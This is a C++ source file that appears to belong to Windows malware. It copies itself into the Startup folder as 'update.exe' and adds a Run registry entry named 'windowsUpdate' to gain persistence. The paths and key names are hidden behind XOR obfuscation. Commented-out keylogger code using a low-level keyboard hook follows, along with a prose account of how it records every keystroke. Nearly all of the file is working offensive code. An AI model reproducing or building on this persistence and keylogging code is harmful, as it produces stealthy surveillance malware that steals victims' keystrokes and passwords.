#include "behave.hpp"
#include "toolskit.hpp"
// #include

std::string cpSelf()
{
    // Get current path
    char cpath[MAX_PATH];
    GetModuleFileNameA(NULL, cpath, MAX_PATH);
    std::string currentPath = (std::string)cpath;

    // Get startup folder
    // APPDATA
    char appData[] = "\x41\x51\x52\x47\x45\x51\x47";
    unxor(appData);

    // \Microsoft\Windows\Start Menu\Programs\Startup
    char startup[] = "\x5c\x4c\x6b\x60\x76\x6a\x75\x68\x6e\x7d\x56\x5c\x65\x63\x6a\x60\x67\x62\x4e\x40\x60\x74\x64\x63\x38\x54\x7f\x75\x69\x41\x4e\x6d\x4f\x46\x50\x42\x49\x56\x7a\x74\x5c\x48\x58\x5f\x59\x5d";
    unxor(startup);

    // \update.exe
    char targetFileName[] = "\x5c\x74\x72\x67\x65\x71\x63\x29\x6d\x71\x6f";
    unxor(targetFileName);

    // Get full path of startup folder
    std::string targetPath = getenv(appData) + (std::string)startup + (std::string)targetFileName;

    BOOL s = CopyFileA(currentPath.c_str(), targetPath.c_str(), false);
    if (s == 1)
        return targetPath;
    return "";
}

bool autoStart(std::string whichToAutoStart)
{
    // ThisIsAnUncrackableKey
    // unxor
    char uncrackableKey[] = "\x54\x69\x6b\x70\x4d\x76\x47\x69\x5d\x67\x69\x79\x6d\x6e\x65\x6e\x72\x7d\x77\x58\x71\x6c";

    // Software\\Microsoft\\Windows\\CurrentVersion\\Run
    // unxor2
    char AUTORUN_REGISTRY[] = "\x08\x08\x10\x08\x3f\x13\x34\x0c\x0a\x33\x2f\x1c\x03\x12\x05\x13\x0e\x0b\x12\x18\x3a\x2f\x3e\x07\x0e\x1d\x3f\x01\x1e\x33\x17\x1c\x12\x01\x05\x0e\x20\x38\x08\x1f\x17\x23\x0b\x18\x09\x35\x3c\x07\x28";
    unxor2(AUTORUN_REGISTRY, unxor(uncrackableKey));

    // windowsUpdate
    // unxor
    char REG_KEY_NAME[] = "\x77\x68\x6c\x67\x6b\x72\x75\x52\x78\x6d\x6b\x7f\x69";
    unxor(REG_KEY_NAME);

    HKEY hkey;
    LONG key = RegOpenKeyExA(HKEY_CURRENT_USER, ((std::string)AUTORUN_REGISTRY).c_str(), 0, KEY_WRITE, &hkey);
    if (ERROR_SUCCESS == key)
    {
        key = RegSetValueExA(hkey, ((std::string)REG_KEY_NAME).c_str(), 0, REG_SZ, (BYTE *)whichToAutoStart.c_str(), strlen(whichToAutoStart.c_str()));
    }
    RegCloseKey(hkey);
    return true;
}

// DWORD WINAPI KeyLogger(LPVOID lpParameter)
// {
// 	HHOOK hKeyHook;
// 	HINSTANCE hExe = GetModuleHandle(NULL);
// 	if (hExe == NULL)
// 	{
// 		return 1;
// 	}
// 	else
// 	{
// 		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
// 		MSG msg;
// 		while (GetMessage(&msg, NULL, 0, 0) != 0)
// 		{
// 			TranslateMessage(&msg);
// 			DispatchMessage(&msg);
// 		}
// 		UnhookWindowsHookEx(hKeyHook);
// 	}
// 	return 0;
// }

// int StartKeyLogging()
// {
// 	HANDLE hThread;
// 	DWORD dwThread;
// 	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger,NULL, 0, NULL);
// 	if (hThread)
// 	{
// 		return WaitForSingleObject(hThread, INFINITE);
// 	}
// 	else
// 	{
// 		return 1;
// 	}
// }

// These are two functions written in C++ that create a keylogger application for Windows.

// The first function is DWORD WINAPI KeyLogger(LPVOID lpParameter). It is a callback function that is registered as a low-level keyboard hook using SetWindowsHookEx() function. When a key is pressed or released, the hook procedure is called and the information about the key event is passed to this function. This function handles the key event by logging the keystrokes to a file or displaying it in some other way. The function takes a single parameter, a pointer to an optional data that can be passed to the thread. It returns a DWORD value that indicates the exit code of the thread.

// The second function is int StartKeyLogging(). It creates a new thread using CreateThread() function and starts executing the KeyLogger() function on the new thread. If the thread is created successfully, this function waits for the thread to complete by calling WaitForSingleObject() function with an infinite timeout. The function returns an integer value that indicates the result of the thread execution. If the thread creation fails, the function returns 1.

// Together, these two functions create a keylogger application that runs in the background and logs all the keystrokes made by the user.